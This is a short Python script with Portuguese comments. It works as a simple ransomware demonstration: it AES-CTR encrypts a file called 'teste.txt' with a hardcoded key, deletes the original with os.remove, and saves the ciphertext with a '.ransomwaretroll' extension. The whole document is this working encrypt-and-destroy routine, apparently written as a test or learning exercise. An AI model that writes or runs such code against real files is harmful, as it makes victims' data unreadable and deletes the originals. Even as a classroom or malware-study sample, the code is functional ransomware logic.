import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

def encrypt_file(file_path, key):
    """Criptografa um arquivo usando AES-CTR."""
    with open(file_path, "rb") as file:
        file_data = file.read()
    
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)
    
    return encrypted_data

# Chave de criptografia
key = b"testeransomwares"

encrypted_data = encrypt_file(file_name, key)

# Remover o arquivo original
os.remove(file_name)

# Criar o arquivo criptografado
encrypted_file = file_name + ".ransomwaretroll"
with open(encrypted_file, "wb") as file:
    file.write(encrypted_data)

print(f"Arquivo '{encrypted_file}' criptografado com sucesso.")
